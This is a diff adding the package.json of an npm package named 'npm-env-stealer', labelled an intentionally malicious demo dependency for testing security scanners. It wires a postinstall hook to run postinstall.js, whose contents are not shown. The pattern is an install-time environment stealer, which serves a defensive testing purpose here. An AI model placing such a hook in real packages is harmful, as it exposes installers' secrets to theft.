@@ -1,0 +1,9 @@
+{
+  "name": "npm-env-stealer",
+  "version": "0.0.1",
+  "description": "Intentionally malicious demo dependency for security scanning",
+  "main": "postinstall.js",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  }
+}
